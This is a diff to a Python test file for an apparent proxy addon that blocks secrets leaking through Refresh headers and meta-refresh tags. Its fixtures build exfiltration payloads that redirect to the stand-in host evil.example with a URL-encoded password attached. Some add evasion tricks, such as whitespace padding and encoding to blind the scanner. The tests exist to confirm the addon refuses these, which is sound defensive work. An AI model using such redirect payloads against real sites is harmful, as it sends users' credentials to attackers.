@@ -2745,11 +2745,16 @@ class RefreshSecretTests(unittest.TestCase):
         self.assertEqual(t("0;url='https://evil.example/cb'"),
                          "https://evil.example/cb")
         self.assertEqual(t("0; URL = https://evil.example/cb ;"),
-                         "https://evil.example/cb")
+                         "https://evil.example/cb ;")
         # Unquoted target runs to end of value: a `;` inside it is
         # part of what the client navigates to, so the check sees it.
         self.assertEqual(t("0;url=https://evil.example/cb;token=1"),
                          "https://evil.example/cb;token=1")
+        # Whitespace does NOT terminate the target: per the HTML
+        # Standard the unquoted URL runs to the end of the input, and
+        # the client navigates past the space.
+        self.assertEqual(t("0;url=https://evil.example/cb?pad=x k=1"),
+                         "https://evil.example/cb?pad=x k=1")
         # Unterminated quote: browsers strip the lone opening quote
         # and navigate anyway — the check must see the same target.
         self.assertEqual(t('0;url="https://evil.example/cb?k=1'),
@@ -2772,6 +2777,39 @@ class RefreshSecretTests(unittest.TestCase):
                        "evil.example"), a.audit_notes)
         self.assertEqual(resp.headers.get("refresh"),
                          "hsurr:refresh-secret-refused")
+
+    def test_refresh_whitespace_before_secret_neutralized(self):
+        # A literal space inside the unquoted target does not stop
+        # the client — and must not stop the check.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        refresh = "0;url=https://evil.example/cb?pad=x k=" + enc
+        self.assertNotIn(SECRETS["pw"], refresh)
+        a, flow, resp = self._flow(200, refresh)
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
+
+    def test_refresh_with_sse_stream_still_killed(self):
+        # Neutralize-without-kill must not become a stream bypass: a
+        # never-ending stream can never be body-scrubbed, so the
+        # finding-40e refusal still kills the flow even though the
+        # Refresh half alone would not.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        a = make_addon()
+        resp = FakeResponse(b"", "text/event-stream", status_code=200)
+        resp.headers.set_all(
+            "refresh", ["0;url=https://evil.example/cb?k=" + enc])
+        flow = Flow(Request("github.com", "/events"))
+        flow.response = resp
+        a.responseheaders(flow)
+        self.assertIsNotNone(flow.error)  # killed by the stream refusal
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertIn(("github.com", "stream-refused", "sse"),
+                      a.audit_notes)
 
 
 class MetaRefreshSecretTests(unittest.TestCase):
@@ -2910,6 +2948,21 @@ class MetaRefreshSecretTests(unittest.TestCase):
         self.assertNotIn("evil.example/cb", resp.text)
         self.assertIn(("github.com", "meta-refresh-secret-refused",
                        "meta-refresh-check-error"), a.audit_notes)
+
+    def test_meta_refresh_whitespace_before_secret_neutralized(self):
+        # A literal space inside the content's url= does not stop the
+        # browser — and must not stop the scan.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?pad=x k=' + enc.encode() + b'">')
+        self.assertNotIn(SECRETS["pw"].encode(), body)  # encoded: blind
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
         # A `>` inside a quoted attribute BEFORE content must not
         # truncate the tag: the browser parses (and follows) the full
         # tag, so the scan must see it too.
